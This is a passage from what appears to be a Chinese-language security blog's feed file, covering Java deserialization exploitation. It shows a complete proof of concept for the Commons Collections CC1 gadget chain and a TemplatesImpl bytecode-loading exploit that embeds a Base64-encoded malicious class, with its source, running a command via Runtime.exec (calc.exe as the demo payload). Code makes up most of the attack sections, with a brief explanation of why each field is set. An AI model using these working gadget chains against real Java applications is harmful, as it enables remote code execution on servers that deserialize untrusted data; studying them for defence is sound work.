class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(runtime);<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(invoke);<br></code></pre></td></tr></table></figure><h3 id="利用ChainedTransformer"><a href="#利用ChainedTransformer" class="headerlink" title="利用ChainedTransformer"></a>利用ChainedTransformer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">InvokerTransformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>       chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1Finsh</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br><br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectObjectHashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, decorate);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImpl加载字节码</title>
    <link href="/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h1><p>上一篇说到加载字节码。用到了<code>url</code>的<code>loadclass</code>和<code>classloader</code>的<code>defineclass</code>但是呢被其作用域限制住了。<br>那我就会想到怎么去找其他类看看会不会又间接调用<code>defineclass</code>的（当然这是在我复习的时候才会想到的+分析了许多的漏洞），这是以后必须养成的习惯（间接！）</p><h2 id="TemplatesImple"><a href="#TemplatesImple" class="headerlink" title="TemplatesImple"></a>TemplatesImple</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012025891.png" alt="QQ截图20220301202453"></p><p>清晰可见这里的<code>defineClass</code>没有了<code>protect</code>，没有作用域？不，它这里的不写，就默认代表了<code>default</code>类，<strong>这是可以被外部调用的</strong>。</p><p>回溯一下。哪里调用了<code>defineClass</code>的<code>TransletClassLoader</code>方法。发现了在<code>TemplatesImpl</code>类中只有 <code>defineTransletClasse</code>调用了。于是继续回溯，查看哪里调用了<code>defineTransletClasse</code>。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250229.png" alt="QQ截图20220301203806"></p><p>显而易见的三种。</p><p>一个一个来看。</p><h4 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h4><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoThree</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(obj,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面解释为什么要反射修改属性值。<br><strong>首先我们注意到在<code>TemplatesImp</code>类中<code>_name</code>、<code>__tfactory</code>、<code>__bytecodes</code>三个属性值都为null。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250759.png" alt="QQ截图20220301221853"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012219267.png" alt="QQ截图20220301221915"></p><p>我们跟着链子走，首先来到。<code>getTransletInstance()</code></p><h4 id="name"><a href="#name" class="headerlink" title="_name"></a>_name</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250225.png" alt="QQ截图20220301220948"></p><p>显而易见如果为null则退出。</p><h4 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250456.png" alt="QQ截图20220301221448"></p><p>显而易见。</p><p>这里的一个小细节。上面截图已经放出。是<code>_bytecodes[ ] [ ] </code>，这里就需要转换一下。<code>new byte[][]&#123;code&#125;</code></p><h4 id="tfactory"><a href="#tfactory" class="headerlink" title="_tfactory"></a>_tfactory</h4><p>它属于<code>TransformerFactoryImpl</code>类，给个<code>new TransformerFactoryImpl()</code>就行</p><h4 id="class"><a href="#class" class="headerlink" title=".class"></a>.class</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EivlTwo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EivlTwo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012238593.png" alt="QQ截图20220301223850"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250011.png" alt="QQ截图20220301223936"></p><p>这里还需要将class文件的类继承<code>AbstractTranslet</code>,不然会读取字节码失败（默认值为-1，进入&lt;0）。也就是无法获取base64中的内容。</p><p>然后就是要触发transform()。<br>对着它的构造来构造一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012255411.png" alt="QQ截图20220301225539"></p><p>至此就结束啦。</p><h3 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h3><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>由于该类的<code>getOutputProperties()</code>会触发<code>newTransformer()</code>，那么其实类型是一样的。只需要修改</p><p> obj.newTransformer();—-&gt;obj.getOutputProperties();<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250693.png" alt="QQ截图20220301223027"></p><h3 id="利用链3"><a href="#利用链3" class="headerlink" title="利用链3"></a>利用链3</h3><p>注意上篇就说到</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>)</span>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>, 是否初始化类, 类加载器)</span>，而<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClass默认不会初始化类方法。<br></code></pre></td></tr></table></figure><p>这里是一个道理：<code>getTransletIndex ()方法</code>就是没又去实例化该对象。而其他两个方法都有。所以无法触发。</p><p>总结（只用到了两条。而这两条也就只是多了一条回溯而已。）</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java动态加载字节码</title>
    <link href="/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
